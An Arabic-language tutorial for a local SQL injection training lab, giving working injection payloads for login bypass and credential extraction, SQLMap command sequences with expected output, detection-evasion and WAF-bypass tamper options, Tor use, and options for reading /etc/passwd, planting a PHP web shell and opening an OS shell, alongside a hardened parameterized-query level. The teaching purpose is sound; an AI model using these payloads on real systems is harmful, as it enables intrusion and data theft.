# 🛡️ دليل SQLMap الشامل - SQL Injection Lab

## 🎯 نظرة عامة

هذا الدليل يوضح كيفية استخدام **SQLMap** لاختبار واكتشاف ثغرات SQL Injection في مختبر الأمان.

---

## 🔧 متطلبات التشغيل

### 1. تثبيت SQLMap:
```bash
# الطريقة 1: باستخدام pip
pip install sqlmap

# الطريقة 2: تحميل مباشر
git clone https://github.com/sqlmapproject/sqlmap.git

# الطريقة 3: على Linux
sudo apt-get install sqlmap
```

### 2. تشغيل المختبر:
```bash
# تشغيل المختبر
start-lab.bat

# التحقق من الوصول
curl http://localhost:3000
```

---

## 🚀 هجمات SQLMap لكل مستوى

### 📋 **المستوى 1: Basic String Injection**

#### تشغيل الهجوم الآلي:
```bash
sqlmap-level1-attack.bat
```

#### 🔥 **الحقن اليدوي خطوة بخطوة:**

##### تشغيل الدليل الشامل:
```bash
manual-level1-complete-guide.bat
```

##### 🎯 **الـ Payloads الأساسية الناجحة:**

**1. تجاوز المصادقة:**
```json
{
  "username": "admin' OR '1'='1' --",
  "password": "anything"
}
```

**2. استخراج إصدار قاعدة البيانات:**
```json
{
  "username": "admin' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL --",
  "password": "test"
}
```

**3. استخراج أسماء قواعد البيانات:**
```json
{
  "username": "admin' UNION SELECT datname,NULL,NULL,NULL,NULL,NULL FROM pg_database --",
  "password": "test"
}
```

**4. استخراج أسماء الجداول:**
```json
{
  "username": "admin' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --",
  "password": "test"
}
```

**5. استخراج هيكل جدول المستخدمين:**
```json
{
  "username": "admin' UNION SELECT column_name,data_type,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' ORDER BY ordinal_position --",
  "password": "test"
}
```

**6. 💎 استخراج جميع بيانات المستخدمين (الأهم):**
```json
{
  "username": "admin' UNION SELECT id||'|'||username||'|'||password||'|'||email||'|'||COALESCE(first_name,'')||'|'||COALESCE(last_name,'')||'|'||role,NULL,NULL,NULL,NULL,NULL FROM users --",
  "password": "test"
}
```

**7. معلومات النظام:**
```json
{
  "username": "admin' UNION SELECT current_user||'|'||current_database()||'|'||version(),NULL,NULL,NULL,NULL,NULL --",
  "password": "test"
}
```

**8. استخراج الجداول الأخرى:**
```json
{
  "username": "admin' UNION SELECT setting_name||'='||setting_value,NULL,NULL,NULL,NULL,NULL FROM admin_settings --",
  "password": "test"
}
```

##### 🏆 **النتائج المتوقعة من الحقن اليدوي:**

**إصدار قاعدة البيانات:**
```
PostgreSQL 15.4 on x86_64-pc-linux-gnu, compiled by gcc
```

**قواعد البيانات المكتشفة:**
```
postgres, sqli_lab, template0, template1
```

**الجداول المكتشفة:**
```
users, admin_settings, logs, user_sessions
```

**بيانات المستخدمين المستخرجة:**
```
1|admin|$2b$10$hash...|admin@lab.com|Admin|User|admin
2|john_doe|$2b$10$hash...|john@lab.com|John|Doe|user
3|jane_smith|$2b$10$hash...|jane@lab.com|Jane|Smith|user
```

#### الأوامر اليدوية لـ SQLMap:
```bash
# 1. اكتشاف الثغرة
sqlmap -u "http://localhost:3000/api/level1" \
  --data='{"username":"admin","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  --batch

# 2. استخراج قواعد البيانات
sqlmap -u "http://localhost:3000/api/level1" \
  --data='{"username":"admin","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  --dbs --batch

# 3. استخراج الجداول
sqlmap -u "http://localhost:3000/api/level1" \
  --data='{"username":"admin","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  -D sqli_lab --tables --batch

# 4. استخراج بيانات المستخدمين
sqlmap -u "http://localhost:3000/api/level1" \
  --data='{"username":"admin","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  -D sqli_lab -T users --dump --batch
```

---

## 📊 **النتائج المتوقعة من SQLMap**

### 🔍 **Phase 1: Vulnerability Detection**
```
[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing if the parameter JSON is dynamic
[INFO] confirming that parameter JSON is dynamic
[INFO] heuristic (basic) test shows that parameter JSON might be injectable
[INFO] testing for SQL injection on parameter JSON
[INFO] testing 'PostgreSQL UNION query (NULL) - 1 to 20 columns'
[INFO] parameter JSON is 'PostgreSQL UNION query (NULL) - 1 to 20 columns' injectable
```

### 🗃️ **Phase 2: Database Discovery**
```
available databases [3]:
[*] information_schema
[*] postgres
[*] sqli_lab
```

### 📋 **Phase 3: Tables Found**
```
Database: sqli_lab
[4 tables]
+------------------+
| admin_settings   |
| logs            |
| user_sessions   |
| users           |
+------------------+
```

### 👥 **Phase 4: Users Table Structure**
```
Database: sqli_lab
Table: users
[7 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| email       | varchar(255) |
| first_name  | varchar(100) |
| id          | int(11)      |
| last_name   | varchar(100) |
| password    | varchar(255) |
| role        | varchar(50)  |
| username    | varchar(100) |
+-------------+--------------+
```

### 💎 **Phase 5: Extracted User Data**
```
Database: sqli_lab
Table: users
[5 entries]
+----+----------+------------------+------------+-----------+-------+----------+
| id | username | email            | first_name | last_name | role  | password |
+----+----------+------------------+------------+-----------+-------+----------+
| 1  | admin    | admin@lab.com    | Admin      | User      | admin | hash123  |
| 2  | john     | john@lab.com     | John       | Doe       | user  | hash456  |
| 3  | jane     | jane@lab.com     | Jane       | Smith     | user  | hash789  |
| 4  | test     | test@lab.com     | Test       | Account   | user  | test123  |
| 5  | guest    | guest@lab.com    | Guest      | User      | guest | guest123 |
+----+----------+------------------+------------+-----------+-------+----------+
```

---

## 🔧 **تقنيات SQLMap المتقدمة**

### 1. **استخدام Request Files:**
```bash
# إنشاء ملف طلب
echo 'POST /api/level1 HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"username":"admin","password":"test"}' > request.txt

# استخدام الملف
sqlmap -r request.txt --batch --level=3 --risk=3
```

### 2. **تقنيات الحقن المختلفة:**
```bash
# Boolean-based blind
sqlmap -u "target" --technique=B

# Time-based blind  
sqlmap -u "target" --technique=T

# Union query
sqlmap -u "target" --technique=U

# Error-based
sqlmap -u "target" --technique=E

# Stacked queries
sqlmap -u "target" --technique=S

# جميع التقنيات
sqlmap -u "target" --technique=BEUST
```

### 3. **خيارات التشغيل المتقدمة:**
```bash
# زيادة مستوى الفحص
--level=5 --risk=3

# تسريع الفحص
--threads=10

# تجنب الكشف
--random-agent --delay=1

# حفظ جلسة العمل
--session-file=session.sqlite

# استخدام Tor للإخفاء
--tor --tor-type=SOCKS5
```

---

## 📈 **أنواع البيانات القابلة للاستخراج**

### 🔑 **معلومات النظام:**
```bash
# معلومات قاعدة البيانات
--banner

# المستخدم الحالي
--current-user

# قاعدة البيانات الحالية
--current-db

# اسم الخادم
--hostname

# كلمات مرور المستخدمين
--passwords

# الامتيازات
--privileges

# الأدوار
--roles
```

### 📊 **البيانات الحساسة:**
```bash
# استخراج جميع البيانات
--dump-all

# استخراج جدول محدد
-T users --dump

# استخراج أعمدة محددة
-T users -C username,password --dump

# استخراج مع شروط
--where="role='admin'"
```

### 🗂️ **ملفات النظام:**
```bash
# قراءة الملفات
--file-read="/etc/passwd"

# كتابة الملفات
--file-write="shell.php" --file-dest="/var/www/shell.php"

# تنفيذ أوامر النظام (إذا كان متاحاً)
--os-shell
```

---

## 🛡️ **تجنب الاكتشاف**

### 1. **تقنيات التمويه:**
```bash
# تغيير User-Agent
--random-agent

# تأخير بين الطلبات
--delay=2

# استخدام Proxy
--proxy="http://127.0.0.1:8080"

# تشفير البيانات
--tamper=space2comment,charencode
```

### 2. **Tamper Scripts:**
```bash
# تجنب فلاتر الأمان
--tamper=apostrophemask,apostrophenullencode,base64encode,between,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

---

## 📋 **تحليل النتائج**

### 🔍 **ملفات الإخراج:**
```bash
# مجلد النتائج
~/.local/share/sqlmap/output/localhost_3000/

# ملفات السجل
~/.local/share/sqlmap/output/localhost_3000/log

# البيانات المستخرجة
~/.local/share/sqlmap/output/localhost_3000/dump/

# جلسة العمل
~/.local/share/sqlmap/output/localhost_3000/session.sqlite
```

### 📊 **تفسير النتائج:**
- **Injectable**: الثغرة موجودة وقابلة للاستغلال
- **Not injectable**: الثغرة غير موجودة أو محمية
- **Unknown**: غير قادر على تحديد الحالة

---

## ⚠️ **تحذيرات مهمة**

### 🚨 **الاستخدام الأخلاقي:**
- ✅ استخدم فقط على الأنظمة التي تملكها
- ✅ احصل على إذن قبل الاختبار
- ❌ لا تستخدم على أنظمة الآخرين بدون إذن

### 🛡️ **في البيئة التعليمية:**
- هذا المختبر مصمم للتعلم
- جميع الثغرات مقصودة
- لا تستخدم هذه التقنيات في الإنتاج

---

## 🔒 **المستوى المستحيل: Impossible Level**

### 🛡️ **نظرة عامة**
هذا المستوى مصمم ليكون **محمي بالكامل** ضد جميع هجمات SQL Injection. الهدف هو إثبات أن جميع محاولات SQLMap ستفشل.

### 🧪 **اختبار الأمان**

#### تشغيل الاختبار الآلي:
```bash
# اختبار SQLMap الشامل
sqlmap-impossible-test.bat

# اختبار يدوي
manual-impossible-test.bat
```

#### الأوامر اليدوية:
```bash
# 1. اختبار أساسي بأقصى مستوى كشف
sqlmap -u "http://localhost:3000/api/impossible" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  --level=5 \
  --risk=3 \
  --batch

# 2. اختبار مع تقنيات التحايل
sqlmap -u "http://localhost:3000/api/impossible" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  --level=5 \
  --risk=3 \
  --tamper=space2comment,charencode,randomcase \
  --batch

# 3. اختبار جميع التقنيات
sqlmap -u "http://localhost:3000/api/impossible" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  --technique=BEUSTQ \
  --level=5 \
  --risk=3 \
  --batch
```

### 📊 **النتائج المتوقعة**

إذا كان التطبيق آمن بشكل صحيح:

```bash
[CRITICAL] all tested parameters do not appear to be injectable
[WARNING] HTTP error codes detected during run:
401 (Unauthorized) - XX times
```

#### ✅ **علامات الأمان الصحيح:**
- جميع اختبارات SQLMap تفشل
- رسائل خطأ عامة فقط
- لا توجد معلومات قاعدة بيانات مكشوفة
- عدم وجود ثغرات قابلة للاستغلال
- استجابات متسقة للمحاولات المختلفة

#### ❌ **ما لا يجب أن يحدث:**
- اكتشاف أي ثغرة SQL injection
- تسريب معلومات قاعدة البيانات
- رسائل خطأ مفصلة
- اختلاف في أوقات الاستجابة
- تسريب معلومات النظام

### 🔍 **تحليل مفصل**

#### الحماية المطبقة:
```typescript
// 1. Parameterized Queries (الحماية الأساسية)
const query = 'SELECT id, username, password, email FROM users WHERE username = $1 LIMIT 1';
const result = await client.query(query, [sanitizedUsername]);

// 2. Input Validation (التحقق من المدخلات)
function validateInput(input: string): { isValid: boolean; sanitized: string } {
  // إزالة الأحرف الخطيرة وفحص أنماط SQL injection
}

// 3. Secure Error Handling (معالجة آمنة للأخطاء)
function createErrorResponse(): NextResponse {
  return NextResponse.json({
    success: false, 
    message: 'Authentication failed. Please check your credentials and try again.'
  }, { status: 401 });
}
```

### 🎯 **أهداف التعلم**

1. **فهم الحماية الكاملة**: كيف تبدو التطبيقات الآمنة
2. **التحقق من فعالية الحماية**: استخدام SQLMap للتأكد من الأمان
3. **تطبيق المعايير**: تعلم أفضل الممارسات الأمنية
4. **اختبار شامل**: التأكد من عدم وجود ثغرات خفية

### 🛠️ **تمارين عملية**

#### 1. **اختبار شامل:**
```bash
# جرب جميع تقنيات SQLMap المتاحة
sqlmap -u "http://localhost:3000/api/impossible" \
  --data='{"username":"*","password":"*"}' \
  --method=POST \
  --content-type="application/json" \
  --level=5 \
  --risk=3 \
  --technique=BEUSTQ \
  --tamper=space2comment,charencode,randomcase,apostrophemask \
  --threads=10 \
  --batch
```

#### 2. **اختبار التحايل:**
```bash
# استخدم تقنيات تحايل متقدمة
sqlmap -u "http://localhost:3000/api/impossible" \
  --data='{"username":"admin","password":"password"}' \
  --method=POST \
  --content-type="application/json" \
  --tamper=equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2mysqlblank \
  --level=5 \
  --risk=3 \
  --batch
```

#### 3. **مقارنة مع المستويات الأخرى:**
- شغل نفس الأوامر على Level 1
- قارن النتائج
- لاحظ الفرق في الاستجابات

### 📈 **قياس النجاح**

المستوى يعتبر **آمن بنجاح** إذا:

1. ✅ جميع اختبارات SQLMap تفشل
2. ✅ لا توجد بيانات مستخرجة
3. ✅ رسائل خطأ عامة فقط
4. ✅ لا توجد معلومات نظام مكشوفة
5. ✅ استجابات متسقة للهجمات المختلفة

### 🎓 **الدروس المستفادة**

- **Parameterized Queries** هي الدفاع الأول والأهم
- **طبقات الحماية المتعددة** أفضل من الاعتماد على حماية واحدة
- **معالجة الأخطاء الآمنة** تمنع تسريب المعلومات
- **التحقق من المدخلات** يضيف طبقة حماية إضافية
- **الاختبار المستمر** ضروري للتأكد من الأمان

---

## 🎯 **المشاريع العملية**

### 1. **مقارنة النتائج:**
- قارن نتائج SQLMap مع الاختبار اليدوي
- تحقق من دقة البيانات المستخرجة

### 2. **تطوير الحماية:**
- استخدم النتائج لتحسين الأمان
- طبق الحلول المقترحة
- اختبر فعالية الحماية

### 3. **توثيق الثغرات:**
- استخدم تقارير SQLMap
- وثق خطوات الاستغلال
- اقترح حلول الحماية

---

## 🎉 **الخاتمة**

SQLMap أداة قوية لاكتشاف واستغلال ثغرات SQL Injection. استخدمها بمسؤولية لتحسين أمان التطبيقات وفهم طبيعة هذه الثغرات.

**تذكر**: الهدف هو التعلم والحماية، وليس الإضرار! 🛡️
